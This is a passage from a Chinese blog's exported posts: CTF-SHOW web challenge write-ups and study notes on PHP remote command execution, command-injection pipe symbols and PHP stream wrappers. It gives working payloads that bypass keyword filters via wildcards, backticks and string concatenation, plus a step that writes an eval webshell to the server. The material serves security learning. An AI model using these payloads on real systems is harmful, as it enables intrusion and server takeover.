<p>所以我们只需要打开F12，在控制台中输入相应信息，再运行游戏即可</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250310132821579.png" alt="image-20250310132821579" style="zoom:67%;">

<p>得到提示</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250310132857228.png" alt="image-20250310132857228" style="zoom:67%;">

<p>进去就是flag</p>
<p>（但我发现，得到的内容是个文件路径，在js脚本中是unicode形式，找到源码了直接把unicode编码变成中文即可）</p>
<h2 id="Web19"><a href="#Web19" class="headerlink" title="Web19"></a>Web19</h2><p>看到这种登录界面首先想到的是sql注入啊，不过这里是POST方法，所以暂时抛弃</p>
<p>查看源码，发现一段隐藏脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$flag</span>=<span class="string">&quot;fakeflag&quot;</span></span><br><span class="line">    <span class="variable">$u</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$p</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pazzword&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$u</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$p</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$u</span>===<span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$p</span> ===<span class="string">&#x27;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><del>这么长一串应该是加密了，都在0~f所以应该是十六进制ASCII码</del></p>
<p>其实这个是AES加密，因为不仅是十六进制而且还是32个十六进制数（16字节，128位）</p>
<p>源码可见：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">function</span> <span class="title function_">checkForm</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> key = <span class="string">&quot;0000000372619038&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> iv = <span class="string">&quot;ilove36dverymuch&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> pazzword = $(<span class="string">&quot;#pazzword&quot;</span>).<span class="title function_">val</span>();</span><br><span class="line">    pazzword = <span class="title function_">encrypt</span>(pazzword,key,iv);</span><br><span class="line">    $(<span class="string">&quot;#pazzword&quot;</span>).<span class="title function_">val</span>(pazzword);</span><br><span class="line">    $(<span class="string">&quot;#loginForm&quot;</span>).<span class="title function_">submit</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">encrypt</span>(<span class="params">data,key,iv</span>) &#123; <span class="comment">//key,iv：16位的字符串</span></span><br><span class="line">    <span class="keyword">var</span> key1  = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Latin1</span>.<span class="title function_">parse</span>(key);</span><br><span class="line">    <span class="keyword">var</span> iv1   = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Latin1</span>.<span class="title function_">parse</span>(iv);</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">encrypt</span>(data, key1,&#123;</span><br><span class="line">        iv : iv1,</span><br><span class="line">        mode : <span class="title class_">CryptoJS</span>.<span class="property">mode</span>.<span class="property">CBC</span>,</span><br><span class="line">        padding : <span class="title class_">CryptoJS</span>.<span class="property">pad</span>.<span class="property">ZeroPadding</span></span><br><span class="line">    &#125;).<span class="title function_">toString</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">密钥为key = &quot;0000000372619038&quot;;</span><br><span class="line">偏移量为iv = &quot;ilove36dverymuch&quot;;</span><br><span class="line">模式为CBC</span><br><span class="line">填充为ZeroPadding</span><br><span class="line">编码为Hex</span><br></pre></td></tr></table></figure>

<p>但还没学AES，有没有什么不吃操作的</p>
<p>有的有的</p>
<ol>
<li>使用bp抓包修改POST参数</li>
<li>使用hackbarPOST传参</li>
</ol>
<p>内容为：<code>username=admin&amp;pazzword=a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04</code></p>
<h2 id="Web20"><a href="#Web20" class="headerlink" title="Web20"></a>Web20</h2><p>使用<code>dirsearch递归搜索</code>，发挥最佳性能</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250310134850993.png" alt="image-20250310134850993"></p>
<p>查看&#x2F;db&#x2F;db.mdb</p>
<p>flag就在其中</p>
<blockquote>
<p>mdb文件是早期asp+access架构的数据库文件，文件泄露相当于数据库被脱裤了。</p>
</blockquote>
]]></content>
      <categories>
        <category>计算机</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>RCE漏洞</title>
    <url>/2025/03/18/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/RCE%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="远程命令执行漏洞"><a href="#远程命令执行漏洞" class="headerlink" title="远程命令执行漏洞"></a>远程命令执行漏洞</h1><p>RCE（remote command&#x2F;code execute，远程命令执行）漏洞，一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口，比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上。</p>
<p>一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。如果设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台执行，从而控制整个后台服务器</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>以PHP为例，system、exec、shell_exec、passthu、popen、proc_popen等函数可以执行系统命令。当我们可以控制这些函数的参数时，就能运行我们想运行的命令，从而进行攻击。</p>
<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><table>
<thead>
<tr>
<th align="center">管道符</th>
<th align="center">作用</th>
<th align="center">举例</th>
</tr>
</thead>
<tbody><tr>
<td align="center">|</td>
<td align="center">直接执行后面的语句</td>
<td align="center">ping 127.0.0.1 | whoami</td>
</tr>
<tr>
<td align="center">||</td>
<td align="center">前面的语句执行出错则执行后面的语句</td>
<td align="center">ping 127.0.0.1 || whoami</td>
</tr>
<tr>
<td align="center">&amp;</td>
<td align="center">前面的语句为假则执行后面的语句</td>
<td align="center">ping 127.0.0.1 &amp; whoami</td>
</tr>
<tr>
<td align="center">&amp;&amp;</td>
<td align="center">前面的语句为假，直接出错；前面的语句为真，执行后面的语句</td>
<td align="center">ping 127.0.0.1 &amp;&amp; whoami</td>
</tr>
</tbody></table>
<h2 id="PHP-RCE"><a href="#PHP-RCE" class="headerlink" title="PHP RCE"></a>PHP RCE</h2><p> PHP RCE指的是通过远程代码执行漏洞来攻击PHP程序的一种方式。简单来说，由于PHP应用程序没有正确处理外部输入数据（用户提交的表单、请求参数等等），此时通过某些手段向PHP应用程序中注入恶意代码，然后通过这些恶意代码实现对攻击服务器的控制。</p>
<h2 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h2><p><a href="https://blog.csdn.net/2301_76690905/article/details/133808536">https://blog.csdn.net/2301_76690905/article/details/133808536</a></p>
<h3 id="题目特征"><a href="#题目特征" class="headerlink" title="题目特征"></a>题目特征</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>preg_replace(pattern, replacement, subject)</p>
<p>pattern:：要搜索的模式，可以使用一些PCRE修饰符</p>
<p>replacement：用于替换的字符串或字符串数组</p>
<p>subject：要进行搜索和替换的字符串或字符串数组</p>
<p>返回值：返回subject，返回类型同subject（字符串或字符串数组）</p>
</blockquote>
<h3 id="相关函数介绍"><a href="#相关函数介绍" class="headerlink" title="相关函数介绍"></a>相关函数介绍</h3><ul>
<li>scandir()</li>
</ul>
<p>​	返回当前目录中的所有文件和目录的列表。返回的结果是一个数组，其中包含当前目录下的所有文件和目录名称</p>
<ul>
<li>localeconv()</li>
</ul>
<p>​	返回一包含本地数字及货币格式信息的数组。（数组的第一项是‘.’，这个 . 的作用很大）</p>
<ul>
<li>current()</li>
</ul>
<p>​	返回数组中的单元，默认取第一个值。pos()和current()是同一个东西</p>
<ul>
<li>getcwd()</li>
</ul>
<p>​	取得当前工作目录</p>
<ul>
<li>dirname()</li>
</ul>
<p>​	函数返回路径中的目录部分</p>
<ul>
<li>chdir()</li>
</ul>
<p>​	函数改变当前的目录</p>
<ul>
<li>array_flip()</li>
</ul>
<p>​	交换数字组中的键和值，成功时返回交换后的数组</p>
<ul>
<li>array_rand()</li>
</ul>
<p>​	从数组中随机取出一个或多个单元</p>
<ul>
<li>array_reverse()</li>
</ul>
<p>​	将数组内容反转</p>
<ul>
<li>strrev()</li>
</ul>
<p>​	用于反转给定字符串</p>
<ul>
<li>eval()、assert()</li>
</ul>
<p>​	命令执行</p>
<ul>
<li>highlightfile()、show_source()、readfile()</li>
</ul>
<p>​	读取文件内容</p>
<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?参数=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())));</span><br></pre></td></tr></table></figure>

<p>实际上作用是返回当前目录：scandir(‘.’)</p>
]]></content>
      <categories>
        <category>计算机</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>php伪协议</title>
    <url>/2025/03/18/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="php伪协议总结"><a href="#php伪协议总结" class="headerlink" title="php伪协议总结"></a>php伪协议总结</h1><p><a href="https://www.cnblogs.com/zzjdbk/p/13030717.html">https://www.cnblogs.com/zzjdbk/p/13030717.html</a></p>
<p>PHP伪协议，也称为PHP流协议，是PHP中用于访问各种资源的封装协议。具体来说，是PHP中用于统一流式接口访问不同资源的特殊协议。它们允许开发人员通过类似文件操作的函数（如fopen()等）处理网络资源、压缩文件、输入输出流等。</p>
<p>之所以被称为伪协议，是因为这些协议并非传统意义上的网络或系统协议，而是PHP内部实现的特殊资源访问机制。是PHP为了简化特定操作而设计的。</p>
<h3 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h3><ul>
<li>非标准协议</li>
</ul>
<p>​	不准寻HTTP，FTP等标准协议规范，而是PHP自定义的语法</p>
<ul>
<li><p>绕过常规文件操作</p>
<p>允许开发者以类似文件操作的方式访问非文件资源（如内存流、输入输出流）</p>
</li>
<li><p>上下文依赖</p>
<p>仅在PHP运行时环境中生效。若将<code>php://filter</code>的URI直接粘贴到浏览器地址栏，浏览器会将其视为无效协议</p>
</li>
</ul>
<h2 id="file-协议"><a href="#file-协议" class="headerlink" title="file:&#x2F;&#x2F;协议"></a>file:&#x2F;&#x2F;协议</h2><p>用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响（即在双off的情况下也能使用）</p>
<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:// [文件的绝对路径和文件名]</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/cmd.php?file=file://D:/soft/phpStudy/WWW/phpcode.txt</span><br></pre></td></tr></table></figure>



<h2 id="php-协议"><a href="#php-协议" class="headerlink" title="php:&#x2F;&#x2F;协议"></a>php:&#x2F;&#x2F;协议</h2><p>PHP向用户提供的指定待打开文件的方式，是一个文件流</p>
<h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>不需要开启allow_url_fopen，仅php:&#x2F;&#x2F;input , php:&#x2F;&#x2F;stdin , php:&#x2F;&#x2F;memory , php:&#x2F;&#x2F;temp。 需要开启 allow_url_include</p>
<h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><p>读取源代码并进行base64编码输出，不然会直接当作php代码执行就看不见源代码内容了</p>
<p>在双off情况下也可以正常使用</p>
<h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><p><img src="https://img2020.cnblogs.com/blog/1937992/202006/1937992-20200602132307452-892692249.png" alt="img"></p>
<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=./cmd.php</span><br></pre></td></tr></table></figure>

<img src="https://img2020.cnblogs.com/blog/1937992/202006/1937992-20200602132442633-1091058952.png" alt="img" style="zoom:50%;">

<p>注意file前后不要加空格</p>
<h2 id="data-协议"><a href="#data-协议" class="headerlink" title="data:&#x2F;&#x2F;协议"></a>data:&#x2F;&#x2F;协议</h2><p><a href="https://www.php.net/manual/zh/wrappers.data.php">https://www.php.net/manual/zh/wrappers.data.php</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data:[&lt;mediatype&gt;][;base64],&lt;data&gt;</span><br></pre></td></tr></table></figure>

<p>用法：<code>data:// —数据</code></p>
<p>说明：<code>数据流封装器</code></p>
<p>必需在双on才能使用</p>
<p>单独的?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain并没有仍和实际执行或展示数据的功能，它只是表达了数据传递的方式，需要后续指定数据内容，比如?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,Hello%20World 就是传递纯文本 “Hello World”。</p>
<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><ol>
<li>打印data:&#x2F;&#x2F;的内容</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 打印 &quot;I love PHP&quot;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;data://text/plain;base64,SSBsb3ZlIFBIUAo=&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>获取媒体类型</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$fp</span>   = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;data://text/plain;base64,&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="variable">$meta</span> = <span class="title function_ invoke__">stream_get_meta_data</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印 &quot;text/plain&quot;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$meta</span>[<span class="string">&#x27;mediatype&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>计算机</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-SHOW刷题记录Web3</title>
    <url>/2025/03/18/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="CTF-SHOW"><a href="#CTF-SHOW" class="headerlink" title="CTF SHOW"></a>CTF SHOW</h1><blockquote>
<p>web29~124</p>
</blockquote>
<h2 id="Web29"><a href="#Web29" class="headerlink" title="Web29"></a>Web29</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="前置基础知识"><a href="#前置基础知识" class="headerlink" title="前置基础知识"></a>前置基础知识</h3><h5 id="eval-函数"><a href="#eval-函数" class="headerlink" title="eval()函数"></a>eval()函数</h5><p>eval()函数<font color="red">把字符串按照PHP代码来计算</font>。该字符串必须是合法的PHP代码，且必须以分号结尾。</p>
<blockquote>
<p>return语句会立即种植对字符串的计算</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(phpcode)</span><br></pre></td></tr></table></figure>

<p>phpcode：必需。规定要计算的PHP代码</p>
<h5 id="system函数"><a href="#system函数" class="headerlink" title="system函数"></a>system函数</h5><p>同C版本的system()函数一样</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="keyword">string</span> <span class="variable">$command</span>, <span class="keyword">int</span> &amp;<span class="variable">$result_code</span> = <span class="literal">null</span>): <span class="keyword">string</span>|<span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p>command：必需。要执行的命令</p>
<p>result_code：可选。如果提供result_code参数，则外部命令执行后的返回状态将会被设置到此变量中</p>
<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>需要输入一个c，c不能包含flag（无论大小写）</p>
<p>即c是读取flag.php的代码，需要绕过flag字符串匹配</p>
<h3 id="几种思路"><a href="#几种思路" class="headerlink" title="几种思路"></a>几种思路</h3><p>一开始使用 <code>ls</code> 命令查看目录，得知flag就在flag.php文件中</p>
<ol>
<li><h5 id="用egrep。egrep-grep-E"><a href="#用egrep。egrep-grep-E" class="headerlink" title="用egrep。egrep &#x3D; grep -E"></a>用egrep。egrep &#x3D; grep -E</h5></li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">system</span>(<span class="string">&quot;cat fl*g.php | grep -E &#x27;fl.g&#x27; &quot;</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>正则表达式</p>
<p>BASH：<a href="https://www.cnblogs.com/phillee/p/10949796.html">https://www.cnblogs.com/phillee/p/10949796.html</a></p>
</blockquote>
<blockquote>
<p>重定向</p>
<p><a href="https://www.runoob.com/w3cnote/shell-scripting.html">https://www.runoob.com/w3cnote/shell-scripting.html</a></p>
</blockquote>
<blockquote>
<p>grep命令用汉语查找文件里符合条件的字符串或正则表达式</p>
<p><a href="https://www.runoob.com/linux/linux-comm-grep.html">https://www.runoob.com/linux/linux-comm-grep.html</a></p>
<p>grep [options] pattern [files]</p>
<p>pattern：表示要查找的字符串或正则表达式</p>
<p>files：表示要查找的文件名，可以多个。默认标准输入</p>
<p>option：</p>
<ul>
<li><code>-i</code>：忽略大小写进行匹配。</li>
<li><code>-v</code>：反向查找，只打印不匹配的行。</li>
<li><code>-n</code>：显示匹配行的行号。</li>
<li><code>-r</code>：递归查找子目录中的文件。</li>
<li><code>-l</code>：只打印匹配的文件名。</li>
<li><code>-c</code>：只打印匹配的行数。</li>
</ul>
</blockquote>
<ol start="2">
<li><h5 id="直接cat（使用通配符绕过，但无回显，需要查看源码）"><a href="#直接cat（使用通配符绕过，但无回显，需要查看源码）" class="headerlink" title="直接cat（使用通配符绕过，但无回显，需要查看源码）"></a>直接cat（使用通配符绕过，但无回显，需要查看源码）</h5></li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">system</span>(<span class="string">&quot;cat fl*g.php&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>但要查看网页源代码</p>
<ol start="3">
<li><h5 id="倒序输出（使用通配符绕过，但有回显）"><a href="#倒序输出（使用通配符绕过，但有回显）" class="headerlink" title="倒序输出（使用通配符绕过，但有回显）"></a>倒序输出（使用通配符绕过，但有回显）</h5></li>
</ol>
<p>并不是说每个词序是反的，而是说文件内容从最后一行开始显示</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">system</span>(<span class="string">&quot;tac fl*g.php&quot;</span>);</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><h5 id="复制到另一个文件中，再查看另一个文件"><a href="#复制到另一个文件中，再查看另一个文件" class="headerlink" title="复制到另一个文件中，再查看另一个文件"></a>复制到另一个文件中，再查看另一个文件</h5></li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">system</span>(<span class="string">&quot;cp fl*g.php a.txt&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>需要访问<code>/a.txt</code></p>
<ol start="5">
<li><h5 id="直接输出一个php，这样就可以不需要绕过了"><a href="#直接输出一个php，这样就可以不需要绕过了" class="headerlink" title="直接输出一个php，这样就可以不需要绕过了"></a>直接输出一个php，这样就可以不需要绕过了</h5></li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;echo -e &quot; &lt;?php \n error_reporting(0); \n  \$c= \$_GET[\&#x27;c\&#x27;]; \n eval(\$c); &quot; &gt; a.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">/a.php?c=<span class="title function_ invoke__">system</span>(<span class="string">&quot;tac flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>

<ol start="6">
<li><h5 id="显示文件命令配合base64编码"><a href="#显示文件命令配合base64编码" class="headerlink" title="显示文件命令配合base64编码"></a>显示文件命令配合base64编码</h5></li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;ZmxhZy5waHA=&quot;</span>));</span><br></pre></td></tr></table></figure>

<blockquote>
<p>highlight_file(filename, return)</p>
<p>filename：必需。规定要显示的文件</p>
<p>return：可选。如果该参数设置为TRUE，该函数将以字符串形式返回高亮显示的代码。默认是FALSE。</p>
</blockquote>
<h2 id="Web30"><a href="#Web30" class="headerlink" title="Web30"></a>Web30</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>这里绕过了<code>flag</code>，<code>system</code>和<code>php</code>、</p>
<h3 id="几种思路-1"><a href="#几种思路-1" class="headerlink" title="几种思路"></a>几种思路</h3><ol>
<li><h5 id="使用passthur绕过system，使用-代替单个字符（实测不行）"><a href="#使用passthur绕过system，使用-代替单个字符（实测不行）" class="headerlink" title="使用passthur绕过system，使用 ? 代替单个字符（实测不行）"></a><del>使用<code>passthur</code>绕过<code>system</code>，使用 <code>?</code> 代替单个字符</del>（实测不行）</h5></li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">passthur</span>(<span class="string">&quot;tac fla*&quot;</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>通配符</p>
<p><a href="https://www.cnblogs.com/ysuwangqiang/p/11364173.html">https://www.cnblogs.com/ysuwangqiang/p/11364173.html</a></p>
</blockquote>
<blockquote>
<p>？ 和  * 的区别</p>
<p><a href="https://blog.csdn.net/weixin_30252651/article/details/115853196">https://blog.csdn.net/weixin_30252651/article/details/115853196</a></p>
</blockquote>
<blockquote>
<p>更多绕过system的方法</p>
<p><a href="https://www.php.cn/faq/298828.html">https://www.php.cn/faq/298828.html</a></p>
</blockquote>
<ol start="2">
<li><h5 id="使用打印文件命令（反字节符配合echo）"><a href="#使用打印文件命令（反字节符配合echo）" class="headerlink" title="使用打印文件命令（反字节符配合echo）"></a>使用打印文件命令（反字节符配合echo）</h5></li>
</ol>
<p>也称为，使用反引号代替system函数起到命令执行的效果</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> `nl fl<span class="string">&#x27;&#x27;</span>ag.p<span class="string">&#x27;&#x27;</span>hp`;</span><br><span class="line"><span class="keyword">echo</span> `cat fl<span class="string">&#x27;&#x27;</span>ag.p<span class="string">&#x27;&#x27;</span>hp`;</span><br><span class="line"><span class="keyword">echo</span> `cat fl*ag.p*hp`;	<span class="comment">#这条最佳</span></span><br><span class="line"><span class="keyword">echo</span> `cp fl*ag.p*hp <span class="number">1</span>.txt | cat <span class="number">1</span>.txt`;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><h5 id="拼接法（感觉不如eval嵌套）"><a href="#拼接法（感觉不如eval嵌套）" class="headerlink" title="拼接法（感觉不如eval嵌套）"></a>拼接法（感觉不如eval嵌套）</h5></li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="variable">$a</span>=sys;<span class="variable">$b</span>=tem;<span class="variable">$d</span>=<span class="variable">$a</span>.<span class="variable">$b</span>;<span class="variable">$d</span>(<span class="string">&quot;tac fl*&quot;</span>);</span><br></pre></td></tr></table></figure>



<h2 id="Web31"><a href="#Web31" class="headerlink" title="Web31"></a>Web31</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤了：<code>flag</code>，<code>system</code>，<code>php</code>，<code>cat</code>，<code>sort</code>，<code>shell</code>，<code>.</code>，<code>‘</code></p>
<h3 id="几种思路-2"><a href="#几种思路-2" class="headerlink" title="几种思路"></a>几种思路</h3><ol>
<li><h5 id="使用eval嵌套"><a href="#使用eval嵌套" class="headerlink" title="使用eval嵌套"></a>使用eval嵌套</h5></li>
</ol>
